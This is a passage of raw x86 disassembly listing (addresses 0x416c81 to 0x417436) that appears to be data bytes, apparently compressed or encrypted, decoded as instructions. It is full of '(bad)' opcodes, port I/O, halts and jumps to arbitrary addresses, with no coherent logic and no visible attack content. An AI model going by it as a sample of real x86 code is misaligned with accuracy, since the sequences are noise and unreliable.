  416c81:	and    edi,esp
  416c83:	add    ebp,ebx
  416c85:	out    0xc3,al
  416c87:	dec    esi
  416c88:	cmp    ebp,edi
  416c8a:	imul   edx,DWORD PTR [esi+0x7],0xbd88ddaa
  416c91:	mov    ds:0xbe0f07eb,al
  416c96:	xchg   edx,eax
  416c97:	repnz in al,dx
  416c99:	sub    esi,ebp
  416c9b:	xor    cl,BYTE PTR [esi+0x42]
  416c9e:	ret    0x6964
  416ca1:	lea    ebp,ds:0x50837bfa
  416ca7:	jnp    0x416cd5
  416ca9:	sbb    al,0x1e
  416cab:	jp     0x416c42
  416cad:	cmp    BYTE PTR [ebx-0x21e31fa5],cl
  416cb3:	mov    eax,0x5d3662d
  416cb8:	xor    esp,DWORD PTR [edx+0x40debfb]
  416cbe:	out    0xd8,eax
  416cc0:	and    ch,bl
  416cc2:	(bad)  
  416cc3:	mov    ch,0xa9
  416cc5:	xchg   esi,eax
  416cc6:	in     eax,0x7d
  416cc8:	mov    es,WORD PTR [ebx-0x6076dcca]
  416cce:	in     al,0x1f
  416cd0:	or     ch,BYTE PTR [edi-0x59]
  416cd3:	outs   dx,BYTE PTR ds:[esi]
  416cd4:	aas    
  416cd5:	aam    0x5d
  416cd7:	pop    esp
  416cd8:	fimul  WORD PTR [ebp-0xf]
  416cdb:	ror    DWORD PTR [edi],0xa9
  416cde:	mov    eax,0xcaf37b5a
  416ce3:	and    esi,DWORD PTR [eax+edx*8+0x4bfe1cc6]
  416cea:	jne    0x416d0d
  416cec:	stos   DWORD PTR es:[edi],eax
  416ced:	jmp    0x416d44
  416cef:	mov    edx,DWORD PTR [edx+0x33]
  416cf2:	inc    ebp
  416cf3:	jb     0x416d23
  416cf5:	jb     0x416c83
  416cf7:	in     al,dx
  416cf8:	ret    0xb3c0
  416cfb:	ret    
  416cfc:	push   eax
  416cfd:	dec    ebp
  416cfe:	fsub   st,st(1)
  416d00:	mov    ah,cl
  416d02:	jo     0x416d5d
  416d04:	(bad)  
  416d05:	and    edi,DWORD PTR [ebx+0x6b]
  416d08:	sbb    eax,0x54583de5
  416d0d:	sbb    WORD PTR [ebx-0x1413806b],di
  416d14:	loopne 0x416d23
  416d16:	lahf   
  416d17:	cs push ss
  416d19:	int    0x5f
  416d1b:	int3   
  416d1c:	or     DWORD PTR [esi-0x25],esp
  416d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d20:	adc    dl,BYTE PTR [eax*2+0x5c2735ca]
  416d27:	xor    DWORD PTR [ecx],esi
  416d29:	push   0xe9f5761c
  416d2e:	jmp    0x122b1f92
  416d33:	stos   BYTE PTR es:[edi],al
  416d34:	cdq    
  416d35:	xchg   edi,eax
  416d36:	xor    BYTE PTR [edi+0x2f],dh
  416d39:	sbb    cl,cl
  416d3b:	mov    ebp,0xdff15c56
  416d40:	jl     0x416db8
  416d42:	test   eax,0x59f1f8ab
  416d47:	int    0x7f
  416d49:	dec    esp
  416d4a:	div    edx
  416d4c:	sbb    bl,dl
  416d4e:	xor    eax,0xf39290de
  416d53:	sahf   
  416d54:	or     eax,0x68b72039
  416d59:	push   ecx
  416d5a:	fwait
  416d5b:	dec    ebx
  416d5c:	pop    esp
  416d5d:	out    dx,eax
  416d5e:	xlat   BYTE PTR ds:[ebx]
  416d5f:	arpl   WORD PTR [ebx-0x3083ed28],bx
  416d65:	in     eax,0x33
  416d67:	inc    edx
  416d68:	sbb    ch,BYTE PTR [eax+ebx*4]
  416d6b:	sbb    al,BYTE PTR [esi+0x46]
  416d6e:	hlt    
  416d6f:	mov    bl,0x4e
  416d71:	sahf   
  416d72:	daa    
  416d73:	mov    eax,0x1d462287
  416d78:	or     ah,BYTE PTR [esp+edi*1+0x58]
  416d7c:	call   0x9f2e:0x137c5f4d
  416d83:	cmp    DWORD PTR [esi-0x33],edi
  416d86:	push   esp
  416d87:	fsub   QWORD PTR [ebx]
  416d89:	and    al,BYTE PTR [esi]
  416d8b:	dec    eax
  416d8c:	shl    BYTE PTR [edi+0x10],0x6d
  416d90:	push   esp
  416d91:	and    BYTE PTR [ecx-0x54fb79bb],al
  416d97:	jbe    0x416dae
  416d99:	das    
  416d9a:	adc    BYTE PTR [edx+0x159bad5a],cl
  416da0:	les    eax,FWORD PTR [eax-0x162a5629]
  416da6:	ret    
  416da7:	push   ds
  416da8:	mov    dl,0x2c
  416daa:	std    
  416dab:	sub    eax,0x58901cc4
  416db0:	and    edx,DWORD PTR [edx-0x230c11f4]
  416db6:	inc    esp
  416db7:	iret   
  416db8:	pusha  
  416db9:	mov    esp,0xae650888
  416dbe:	out    0x55,eax
  416dc0:	mov    ch,BYTE PTR [ecx]
  416dc2:	xchg   esi,eax
  416dc3:	mov    dh,BYTE PTR [ecx+esi*8+0x11ebf504]
  416dca:	in     eax,0xed
  416dcc:	cmp    BYTE PTR [eax-0xf],dh
  416dcf:	jae    0x416dd5
  416dd1:	add    bl,dl
  416dd3:	ror    dl,1
  416dd5:	int3   
  416dd6:	mov    ebx,0xdb5a4da7
  416ddb:	ficomp WORD PTR cs:[edx+0x4315be86]
  416de2:	push   esi
  416de3:	cmp    DWORD PTR [esi],edi
  416de5:	push   ds
  416de6:	sar    DWORD PTR [ecx+eiz*8+0x4fef1c5a],0x5e
  416dee:	pop    ecx
  416def:	inc    esp
  416df0:	retf   0x2b75
  416df3:	push   ecx
  416df4:	pop    ebx
  416df5:	adc    DWORD PTR [esi-0x14],edx
  416df8:	dec    esp
  416df9:	and    esi,ecx
  416dfb:	mov    ds:0x42bd151,al
  416e00:	push   edx
  416e01:	leave  
  416e02:	lods   eax,DWORD PTR ds:[esi]
  416e03:	dec    edx
  416e04:	repz iret 
  416e06:	push   ebx
  416e07:	std    
  416e08:	jae    0x416e74
  416e0a:	xor    dl,bh
  416e0c:	lods   eax,DWORD PTR fs:[esi]
  416e0e:	xchg   BYTE PTR [ebx],bh
  416e10:	nop
  416e11:	add    BYTE PTR [esp+ecx*1-0x63],cl
  416e15:	push   esp
  416e16:	push   eax
  416e17:	mov    BYTE PTR [eax+0x2f],bh
  416e1a:	jbe    0x416dfb
  416e1c:	stc    
  416e1d:	jns    0x416dab
  416e1f:	adc    dh,ch
  416e21:	or     eax,0x91b1fa5c
  416e26:	xor    al,0x7c
  416e28:	xlat   BYTE PTR ds:[ebx]
  416e29:	push   0xffffffa2
  416e2b:	sub    BYTE PTR [edx-0x5d],dh
  416e2e:	pop    ebp
  416e2f:	and    al,0x4
  416e31:	inc    eax
  416e32:	pop    ecx
  416e33:	imul   ebx,DWORD PTR [esi+0x69],0xebdc6d16
  416e3a:	jno    0x416e11
  416e3c:	xor    BYTE PTR [eax+0x7378017d],cl
  416e42:	sub    bl,BYTE PTR [ecx+0x678ae754]
  416e48:	repnz sti 
  416e4a:	pop    esp
  416e4b:	gs out 0xbc,eax
  416e4e:	dec    ebx
  416e4f:	test   DWORD PTR [edi],esi
  416e51:	into   
  416e52:	and    BYTE PTR [eax],ah
  416e54:	pop    eax
  416e55:	jmp    0x4cdf0f80
  416e5a:	mov    dl,0x47
  416e5c:	push   es
  416e5d:	stos   DWORD PTR es:[edi],eax
  416e5e:	ins    DWORD PTR es:[edi],dx
  416e5f:	jmp    0x13c074c
  416e64:	cmp    edi,DWORD PTR [eax]
  416e66:	mov    ah,0xd6
  416e68:	dec    ebp
  416e69:	and    BYTE PTR [edx],al
  416e6b:	scas   al,BYTE PTR es:[edi]
  416e6c:	shr    dh,0x8d
  416e6f:	mov    ecx,0xa5637bbd
  416e74:	push   ss
  416e75:	jle    0x416e42
  416e77:	inc    edi
  416e78:	xchg   BYTE PTR [eax-0x7b],ah
  416e7b:	ins    DWORD PTR es:[edi],dx
  416e7c:	hlt    
  416e7d:	dec    edx
  416e7e:	jnp    0x416ed0
  416e80:	pusha  
  416e81:	clc    
  416e82:	inc    eax
  416e83:	push   esi
  416e84:	add    DWORD PTR [esi+0x43bc7d39],eax
  416e8a:	xchg   DWORD PTR [esp+ebp*8+0x57],esi
  416e8e:	or     ebp,DWORD PTR gs:[ecx+eax*4-0x14]
  416e93:	or     edi,DWORD PTR [ebx-0x51aa2823]
  416e99:	fnstenv [edx+0x16]
  416e9c:	sti    
  416e9d:	dec    ebx
  416e9e:	jmp    0x7175:0x204815ed
  416ea5:	mov    ds:0x755b3e3e,al
  416eaa:	xor    ebp,DWORD PTR [eax-0x75]
  416ead:	push   ds
  416eae:	push   0xfffffffe
  416eb0:	inc    ebx
  416eb1:	and    al,0x38
  416eb3:	(bad)  
  416eb4:	mov    cl,0x2a
  416eb6:	inc    esi
  416eb7:	outs   dx,BYTE PTR ds:[esi]
  416eb8:	(bad)  
  416eb9:	je     0x416f14
  416ebb:	gs enter 0x2a6f,0xd9
  416ec0:	xchg   edi,eax
  416ec1:	imul   edx,ebx,0xffffffd4
  416ec4:	pusha  
  416ec5:	inc    esp
  416ec6:	push   ebx
  416ec7:	mov    ebp,0xc348382
  416ecc:	popa   
  416ecd:	into   
  416ece:	inc    esp
  416ecf:	sahf   
  416ed0:	push   0xd3e13907
  416ed5:	out    0xff,eax
  416ed7:	shr    DWORD PTR [edx+eax*1],1
  416eda:	rcr    BYTE PTR [esi-0x38],0xbd
  416ede:	jns    0x416f47
  416ee0:	mov    al,0xf8
  416ee2:	in     eax,dx
  416ee3:	sub    al,0xd4
  416ee5:	iret   
  416ee6:	cwde   
  416ee7:	aad    0x69
  416ee9:	cli    
  416eea:	adc    esi,DWORD PTR [edi+edx*1]
  416eed:	adc    BYTE PTR [ecx+esi*1],ch
  416ef0:	cwde   
  416ef1:	inc    ebp
  416ef2:	shl    BYTE PTR [eax],1
  416ef4:	int    0xde
  416ef6:	scas   eax,DWORD PTR es:[edi]
  416ef7:	in     al,0x22
  416ef9:	sbb    al,0x4f
  416efb:	and    ecx,DWORD PTR [esi+0xb]
  416efe:	mov    ds:0x455b856e,eax
  416f03:	ret    
  416f04:	sbb    DWORD PTR [edx-0x23],ecx
  416f07:	adc    al,0x54
  416f09:	ja     0x416ee3
  416f0b:	ret    0x5b5
  416f0e:	retf   
  416f0f:	(bad)  
  416f10:	fcmovnb st,st(1)
  416f12:	push   es
  416f13:	in     eax,0x40
  416f15:	not    BYTE PTR [edi+0x16be610f]
  416f1b:	adc    BYTE PTR [ecx-0x29],ah
  416f1e:	dec    edx
  416f1f:	(bad)  
  416f20:	inc    eax
  416f21:	(bad)  
  416f22:	(bad)  
  416f24:	inc    sp
  416f26:	(bad)  
  416f27:	dec    ebx
  416f28:	adc    eax,DWORD PTR ds:0x75c617e7
  416f2e:	cwde   
  416f2f:	mov    ds:0x633c82f7,al
  416f34:	ins    DWORD PTR es:[edi],dx
  416f35:	mov    esi,0xcaaed7c
  416f3a:	mov    ebp,0xe7f1c429
  416f3f:	icebp  
  416f40:	cmp    al,0xd6
  416f42:	xor    ecx,DWORD PTR [edi+ebx*2]
  416f45:	cmp    DWORD PTR [ebx],ebp
  416f47:	mov    bl,0x4b
  416f49:	pop    edi
  416f4a:	pop    edx
  416f4b:	pusha  
  416f4c:	in     al,dx
  416f4d:	dec    esp
  416f4e:	mov    eax,ds:0x32fc9fb
  416f53:	es xchg ebx,eax
  416f55:	shl    ebx,cl
  416f57:	cdq    
  416f58:	ret    
  416f59:	jo     0x416fa8
  416f5b:	sbb    bl,BYTE PTR [ecx+0x17ee0b34]
  416f61:	jp     0x416f1c
  416f63:	inc    edi
  416f64:	mov    ch,0x37
  416f66:	test   BYTE PTR [ecx+0x6c353057],dh
  416f6c:	adc    edx,0x60c1b20e
  416f72:	push   edi
  416f73:	mov    ecx,0x5592fdc5
  416f78:	fild   QWORD PTR [eax]
  416f7a:	stos   BYTE PTR es:[edi],al
  416f7b:	loope  0x416f49
  416f7d:	test   BYTE PTR [ebx-0x1b8b761],ah
  416f83:	sti    
  416f84:	push   0x2caca783
  416f89:	cli    
  416f8a:	jne    0x416f0d
  416f8c:	sub    al,0xa8
  416f8e:	ja     0x416fc2
  416f90:	ins    DWORD PTR es:[edi],dx
  416f91:	loopne 0x417005
  416f93:	pop    es
  416f94:	xchg   edi,eax
  416f95:	outs   dx,BYTE PTR ds:[esi]
  416f96:	jns    0x416f80
  416f98:	fld    DWORD PTR [edx-0x385d84aa]
  416f9e:	push   ds
  416f9f:	push   eax
  416fa0:	and    DWORD PTR [edx-0x3],0x9153044a
  416fa7:	xlat   BYTE PTR ds:[ebx]
  416fa8:	repnz pop ebx
  416faa:	jecxz  0x416f3c
  416fac:	fst    QWORD PTR [edi]
  416fae:	call   0xdea03077
  416fb3:	cmp    al,0x23
  416fb5:	lahf   
  416fb6:	test   eax,0x869150de
  416fbb:	pop    ebx
  416fbc:	cli    
  416fbd:	add    eax,0x338d27af
  416fc2:	pop    ds
  416fc3:	push   edi
  416fc4:	pop    edi
  416fc5:	inc    esp
  416fc6:	sbb    BYTE PTR ds:0x160189b3,bh
  416fcc:	outs   dx,DWORD PTR ds:[esi]
  416fcd:	aaa    
  416fce:	push   es
  416fcf:	xor    esp,edi
  416fd1:	push   edi
  416fd2:	add    eax,0x2fc9c1d6
  416fd7:	lds    eax,FWORD PTR ds:0x125f6f1c
  416fdd:	sar    DWORD PTR [ebp-0x1a],cl
  416fe0:	sub    BYTE PTR [eax-0x228ca9e5],ch
  416fe6:	ins    BYTE PTR es:[edi],dx
  416fe7:	aas    
  416fe8:	cmp    ch,0xee
  416feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fec:	fldcw  WORD PTR [esi-0x56]
  416fef:	(bad)  
  416ff1:	inc    ebx
  416ff2:	cmp    BYTE PTR [eax+eiz*4+0x5427b8df],0x84
  416ffa:	nop
  416ffb:	and    ebx,edi
  416ffd:	in     eax,0x13
  416fff:	mov    bl,0xd1
  417001:	ins    DWORD PTR es:[edi],dx
  417002:	lahf   
  417003:	push   edx
  417004:	clc    
  417005:	or     ah,BYTE PTR [eax-0x3c]
  417008:	das    
  417009:	push   edx
  41700a:	fist   DWORD PTR ds:0xdd2d38eb
  417010:	adc    eax,0x66c9dd3e
  417015:	dec    esi
  417016:	jb     0x417082
  417018:	nop
  417019:	cmc    
  41701a:	pop    esp
  41701b:	stc    
  41701c:	pushf  
  41701d:	cld    
  41701e:	lahf   
  41701f:	mov    ecx,0x1d312926
  417024:	sbb    esp,DWORD PTR [ecx]
  417026:	sbb    eax,0xa62c6b0
  41702b:	jmp    0x41705e
  41702d:	mov    bl,bl
  41702f:	pop    ss
  417030:	imul   eax,DWORD PTR [edx],0x14
  417033:	pop    ebx
  417034:	cmc    
  417035:	(bad)  
  417036:	mov    dl,0x6f
  417038:	or     ebp,DWORD PTR [edi]
  41703a:	xor    edi,eax
  41703c:	jmp    0x983c6bef
  417041:	xor    al,0x1f
  417043:	(bad)  
  417044:	pop    eax
  417045:	stc    
  417046:	push   esi
  417047:	jnp    0x417086
  417049:	xchg   edx,eax
  41704a:	dec    eax
  41704b:	out    0x7b,eax
  41704d:	dec    edi
  41704e:	in     al,dx
  41704f:	or     al,0x4c
  417051:	sbb    al,0x4f
  417053:	stos   BYTE PTR es:[edi],al
  417054:	dec    edi
  417055:	mov    esi,0xa5bf2346
  41705a:	sahf   
  41705b:	scas   al,BYTE PTR es:[edi]
  41705c:	(bad)  
  41705e:	jne    0x4170c5
  417060:	sbb    DWORD PTR [ebp-0x52],0xffffffed
  417064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417065:	dec    ecx
  417066:	(bad)  
  417067:	imul   esi,DWORD PTR [edx+0x7d],0xb549d483
  41706e:	dec    eax
  41706f:	out    dx,eax
  417070:	and    bl,BYTE PTR [edx]
  417072:	mov    DWORD PTR [ecx+0x74],ecx
  417075:	jge    0x417071
  417077:	jge    0x4170ba
  417079:	neg    ah
  41707b:	mov    ds:0x6cc3ca49,al
  417080:	xlat   BYTE PTR ds:[ebx]
  417081:	mov    al,0xd4
  417083:	mov    edx,0xca14451f
  417088:	or     dl,dh
  41708a:	inc    edx
  41708b:	sbb    DWORD PTR [esi-0x3f],0xc0b764f
  417092:	mov    edx,0x1bc10883
  417097:	loopne 0x417092
  417099:	mov    ebp,ecx
  41709b:	sub    eax,0x484be78e
  4170a0:	lock aam 0xe5
  4170a3:	push   edi
  4170a4:	lahf   
  4170a5:	in     al,dx
  4170a6:	fstp   QWORD PTR [edi-0x25]
  4170a9:	inc    ecx
  4170aa:	sub    DWORD PTR [ebp-0x2b],ebx
  4170ad:	mov    eax,ds:0xe7db63cf
  4170b2:	retf   0xe773
  4170b5:	pop    eax
  4170b6:	add    BYTE PTR ds:0x8fa02d3c,ah
  4170bc:	(bad)  
  4170bd:	popf   
  4170be:	xor    al,0x95
  4170c0:	jno    0x41709c
  4170c2:	adc    DWORD PTR [eax+0x64],eax
  4170c5:	leave  
  4170c6:	ja     0x4170f3
  4170c8:	xchg   esi,eax
  4170c9:	xor    eax,0xcd5a41c3
  4170ce:	pop    ecx
  4170cf:	popa   
  4170d0:	pop    edi
  4170d1:	repnz lds edi,FWORD PTR [ecx]
  4170d4:	ret    
  4170d5:	nop
  4170d6:	pop    esi
  4170d7:	add    al,0x3e
  4170d9:	aam    0xdd
  4170db:	xchg   esp,eax
  4170dc:	mov    edi,0x1d82a352
  4170e1:	inc    BYTE PTR [esi]
  4170e3:	nop
  4170e4:	cmp    eax,0x589a940b
  4170e9:	call   edi
  4170eb:	inc    ebp
  4170ec:	(bad)  
  4170ed:	xchg   ecx,eax
  4170ee:	and    cl,ch
  4170f0:	mov    edi,0x9a0f1f29
  4170f5:	jnp    0x4170ca
  4170f7:	in     al,dx
  4170f8:	or     edi,DWORD PTR [edx-0x2a]
  4170fb:	xchg   ebp,eax
  4170fc:	enter  0xf345,0xec
  417100:	nop
  417101:	movhps xmm2,QWORD PTR ds:0x34925998
  417108:	mov    ds:0x828d5467,eax
  41710d:	imul   ebx,ecx,0xa6a1608
  417113:	sahf   
  417114:	ret    0xe35d
  417117:	loopne 0x4170a8
  417119:	add    BYTE PTR [eax],dh
  41711b:	aad    0x64
  41711d:	lahf   
  41711e:	call   0x4360:0x7a0ba3db
  417125:	aad    0xc9
  417127:	mul    DWORD PTR [eax]
  417129:	sub    eax,0xe534a838
  41712e:	scas   eax,DWORD PTR es:[edi]
  41712f:	ret    
  417130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417131:	sbb    esi,esp
  417133:	icebp  
  417134:	idiv   BYTE PTR [edx+0x77]
  417137:	enter  0xae94,0xdb
  41713b:	addr16 pop ebx
  41713d:	jg     0x41712b
  41713f:	inc    ebx
  417140:	mov    ah,0xf5
  417142:	neg    DWORD PTR [edx+0x55]
  417145:	(bad)  
  417146:	imul   esp,edi,0x86c86f56
  41714c:	mov    al,ds:0x9f8b6aa7
  417151:	fisttp QWORD PTR [edx]
  417153:	or     esp,DWORD PTR [ebp+0x5c4fa383]
  417159:	cld    
  41715a:	push   edx
  41715b:	ror    DWORD PTR [ebx+edi*4+0x7894d0bd],0xb5
  417163:	mov    ecx,0x2efdd3cb
  417168:	mov    cl,0x3d
  41716a:	sbb    al,0xdd
  41716c:	mov    al,ds:0x89cc9862
  417171:	shl    DWORD PTR [edi-0xa],0xb0
  417175:	jnp    0x41710b
  417177:	mov    esi,0x7de8a835
  41717c:	jge    0x4171f2
  41717e:	mov    al,ds:0x62892f28
  417183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417184:	xchg   esi,eax
  417185:	retf   0x4ee
  417188:	mov    dh,0x93
  41718a:	repz jmp 0x1559a2
  417190:	cs jecxz 0x4171f3
  417193:	push   ebx
  417194:	xor    ebp,edi
  417196:	pop    DWORD PTR [eax+0x536d3409]
  41719c:	lods   eax,DWORD PTR ds:[esi]
  41719d:	add    BYTE PTR [edi+edi*4-0x17d98557],ch
  4171a4:	stos   DWORD PTR es:[edi],eax
  4171a5:	mov    esi,0xd2d331f4
  4171aa:	xor    al,0xfa
  4171ac:	cld    
  4171ad:	sbb    BYTE PTR [esi+0x41],dl
  4171b0:	xor    BYTE PTR [edx],dh
  4171b2:	scas   al,BYTE PTR es:[edi]
  4171b3:	js     0x417171
  4171b5:	lock jb 0x417139
  4171b8:	add    dl,BYTE PTR [ebx+0x2a]
  4171bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171bc:	jmp    0x6d4006ed
  4171c1:	xor    al,0x55
  4171c3:	pop    eax
  4171c4:	mov    dh,0xce
  4171c6:	mov    ah,0xd9
  4171c8:	cmp    al,0xd7
  4171ca:	push   ecx
  4171cb:	ss in  eax,0x63
  4171ce:	in     eax,0x85
  4171d0:	push   edi
  4171d1:	outs   dx,DWORD PTR ds:[esi]
  4171d2:	sbb    cl,BYTE PTR cs:[ebx]
  4171d5:	hlt    
  4171d6:	mov    gs,WORD PTR [edi+0xdee8e61]
  4171dc:	out    0xcc,al
  4171de:	enter  0xcc3,0xe2
  4171e2:	ins    DWORD PTR es:[edi],dx
  4171e3:	push   ebp
  4171e4:	jb     0x417193
  4171e6:	xrelease xchg DWORD PTR cs:[esi],eax
  4171ea:	add    al,0xaf
  4171ec:	push   edi
  4171ed:	adc    al,BYTE PTR [esi+0x26946e04]
  4171f3:	test   al,0xd1
  4171f5:	inc    ebp
  4171f6:	cmp    BYTE PTR [ebx-0x61],bl
  4171f9:	or     BYTE PTR [ecx+0x15],dl
  4171fc:	cmp    esp,edx
  4171fe:	jo     0x41722c
  417200:	sbb    ecx,DWORD PTR [edi-0xcaf952c]
  417206:	lock fmul DWORD PTR es:[ebp+0x461c0151]
  41720e:	or     ch,bl
  417210:	mov    esi,0x7dbc3443
  417215:	pop    eax
  417216:	jae    0x417211
  417218:	push   ebp
  417219:	adc    eax,0xfddc6428
  41721e:	fwait
  41721f:	ins    BYTE PTR es:[edi],dx
  417220:	push   ecx
  417221:	pop    ebx
  417222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417223:	inc    ebx
  417224:	push   0x51
  417226:	mov    cl,0xe6
  417228:	cdq    
  417229:	and    DWORD PTR es:[esi+0x31],eax
  41722d:	in     eax,dx
  41722e:	cmc    
  41722f:	loope  0x41722c
  417231:	test   ah,cl
  417233:	in     al,0xeb
  417235:	sub    ebp,DWORD PTR [esp+esi*2-0x41]
  417239:	pop    ecx
  41723a:	push   ebp
  41723b:	jp     0x417240
  41723d:	fdiv   QWORD PTR [edx]
  41723f:	test   DWORD PTR [esi-0x80],ecx
  417242:	xchg   esp,eax
  417243:	adc    al,0xab
  417245:	dec    esp
  417246:	jmp    0x264d9566
  41724b:	mov    eax,ds:0xea98e1e2
  417250:	mov    ebx,0x682de6b3
  417255:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417257:	mov    ebx,0x32babdb9
  41725c:	xor    edx,DWORD PTR [edi+0x5871b42]
  417262:	or     al,BYTE PTR [ebx+0x7631319]
  417268:	push   edx
  417269:	and    ebp,esp
  41726b:	stos   BYTE PTR es:[edi],al
  41726c:	mov    ah,BYTE PTR [ecx]
  41726e:	fwait
  41726f:	aas    
  417270:	sahf   
  417271:	pop    ecx
  417272:	stos   BYTE PTR es:[edi],al
  417273:	mov    WORD PTR [ebx],ss
  417275:	ins    DWORD PTR es:[edi],dx
  417276:	cmp    DWORD PTR [edx+0x31d3b092],ebp
  41727c:	or     cl,dl
  41727e:	inc    edx
  41727f:	icebp  
  417280:	dec    edi
  417281:	pusha  
  417282:	push   ss
  417283:	xor    ah,BYTE PTR [ecx+ecx*2]
  417286:	bsr    edi,DWORD PTR [ebx+0x3c32368]
  41728d:	pop    edi
  41728e:	or     cl,BYTE PTR [ecx+0x33ed5729]
  417294:	inc    ebp
  417295:	inc    ecx
  417296:	cli    
  417297:	adc    DWORD PTR [ecx-0x1f],eax
  41729a:	(bad)  
  41729b:	std    
  41729c:	and    DWORD PTR [esi+0x69],ebp
  41729f:	sbb    eax,0xd2034ed3
  4172a4:	pop    ebp
  4172a5:	xor    al,0xc
  4172a7:	inc    ecx
  4172a8:	mov    dh,0x6
  4172aa:	aaa    
  4172ab:	int    0x11
  4172ad:	jle    0x417273
  4172af:	mov    eax,ds:0x6a723c1
  4172b4:	inc    edi
  4172b5:	shl    BYTE PTR [edi+esi*1],cl
  4172b8:	dec    ecx
  4172b9:	ja     0x417328
  4172bb:	mov    al,0xfc
  4172bd:	cld    
  4172be:	sub    edx,DWORD PTR [ecx+ebp*2]
  4172c1:	pop    esi
  4172c2:	cmp    eax,0xd4b26940
  4172c7:	dec    ecx
  4172c8:	dec    eax
  4172c9:	cmp    esi,ebp
  4172cb:	imul   ebx,esi,0x63045288
  4172d1:	cmp    edi,DWORD PTR [edi-0x346c42c]
  4172d7:	mov    ecx,0x828afd1f
  4172dc:	push   esi
  4172dd:	or     al,0xa8
  4172df:	cmp    edx,DWORD PTR [ecx-0x689a4571]
  4172e5:	add    ah,BYTE PTR [ecx]
  4172e7:	cmc    
  4172e8:	pop    ds
  4172e9:	aad    0x2b
  4172eb:	push   ecx
  4172ec:	jnp    0x4172ae
  4172ee:	mov    eax,ds:0xe451f9e5
  4172f4:	or     dh,ah
  4172f6:	sub    BYTE PTR ds:0x301792a9,al
  4172fc:	inc    eax
  4172fd:	pop    edx
  4172fe:	mov    dl,0x45
  417300:	pop    ebp
  417301:	adc    DWORD PTR [edx-0x1ee8f71e],ebp
  417307:	sub    esp,DWORD PTR [edx-0x5df05a12]
  41730d:	dec    edi
  41730e:	mov    bh,0x3f
  417310:	neg    ch
  417312:	push   edi
  417313:	rol    BYTE PTR [edi+0x71163745],0x75
  41731a:	jb     0x4172e8
  41731c:	sbb    ch,bh
  41731e:	inc    esp
  41731f:	test   BYTE PTR [ecx-0x4214a3a9],dh
  417325:	cli    
  417326:	lods   eax,DWORD PTR ds:[esi]
  417327:	add    ebx,DWORD PTR [edi+esi*4]
  41732a:	stos   DWORD PTR es:[edi],eax
  41732b:	pop    ds
  41732c:	pop    edx
  41732d:	sub    eax,0x138704fe
  417332:	cmc    
  417333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417334:	xchg   bl,dh
  417336:	ret    
  417337:	rcl    BYTE PTR [edi+0x78],0xda
  41733b:	(bad)
  41733e:	pop    ebp
  41733f:	xor    esp,DWORD PTR [ebx-0x5d]
  417342:	test   esi,esp
  417344:	mov    dh,0x5c
  417346:	sbb    edi,ebp
  417348:	or     bh,BYTE PTR [esi]
  41734a:	mov    esp,0x2884f234
  41734f:	rol    DWORD PTR [ecx+0x52],1
  417352:	mov    eax,ds:0x366f921b
  417357:	mov    eax,0x7ce7319a
  41735c:	into   
  41735d:	out    dx,al
  41735e:	lock mov cl,0x60
  417361:	and    eax,DWORD PTR [eax+0x43]
  417364:	mov    dh,0x48
  417366:	xlat   BYTE PTR ds:[ebx]
  417367:	dec    ecx
  417368:	stos   DWORD PTR es:[edi],eax
  417369:	out    dx,eax
  41736a:	xor    DWORD PTR [eax+0x7a6eede2],ecx
  417370:	mov    eax,ds:0x13c76dc7
  417375:	xchg   esi,eax
  417376:	jmp    0x54e6:0x78ae0088
  41737d:	mov    gs,WORD PTR [eax+0x3a]
  417380:	call   0xd093:0x6d00ccde
  417387:	mov    ebx,0x94fd017
  41738c:	mov    ebp,0x47da87d
  417391:	add    edx,ebx
  417393:	aad    0x41
  417395:	push   es
  417396:	dec    BYTE PTR [edi+0xadfba40]
  41739c:	jns    0x4173fe
  41739e:	cs ds xor eax,0x7ecd9194
  4173a5:	pop    esp
  4173a6:	mov    ecx,0xa4a09d0f
  4173ab:	inc    eax
  4173ac:	aas    
  4173ad:	jmp    0x4173e1
  4173af:	pop    esp
  4173b0:	sub    al,0xd1
  4173b2:	mov    cl,0x3f
  4173b4:	pop    ecx
  4173b5:	in     eax,dx
  4173b6:	or     edi,DWORD PTR [edi-0x3e]
  4173b9:	int    0x61
  4173bb:	cwde   
  4173bc:	inc    edi
  4173bd:	mov    ah,0x94
  4173bf:	ror    bh,cl
  4173c1:	and    eax,0xe509c7d8
  4173c6:	(bad)  
  4173c7:	fcomp  QWORD PTR [ebx+0xf]
  4173ca:	mov    esi,0xb5162fa5
  4173cf:	pop    esi
  4173d0:	inc    esp
  4173d1:	or     ebx,edx
  4173d3:	fiadd  DWORD PTR ds:0x5477bab
  4173d9:	adc    al,0x38
  4173db:	add    eax,0xd7095896
  4173e0:	pop    ebp
  4173e1:	faddp  st(3),st
  4173e3:	xchg   BYTE PTR [ebp-0x3ae34b27],bl
  4173e9:	fs and al,0xdf
  4173ec:	adc    ebp,eax
  4173ee:	not    BYTE PTR [ecx+0x1d2b0d3e]
  4173f4:	in     eax,dx
  4173f5:	xchg   esp,eax
  4173f6:	sub    DWORD PTR [ebp+eax*8-0x35],0x7c
  4173fb:	test   BYTE PTR [ebx],ah
  4173fd:	shr    edx,1
  4173ff:	adc    DWORD PTR [ecx+0x7d],eax
  417402:	inc    esi
  417403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417404:	or     bh,BYTE PTR ds:0x608af28b
  41740a:	je     0x41743f
  41740c:	jl     0x41747e
  41740e:	mov    edi,es
  417410:	mov    edx,0x972a5a38
  417415:	ret    0x47e3
  417418:	nop
  417419:	push   DWORD PTR [eax]
  41741b:	mov    edx,0xa8bda545
  417420:	mov    al,ds:0x3aeebc6b
  417425:	stos   BYTE PTR es:[edi],al
  417426:	scas   al,BYTE PTR es:[edi]
  417427:	or     al,0x8
  417429:	jno    0x417455
  41742b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41742c:	jl     0x41745d
  41742e:	in     al,0x57
  417430:	ror    BYTE PTR [ebx],cl
  417432:	push   0x37
  417434:	jo     0x417443
  417436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
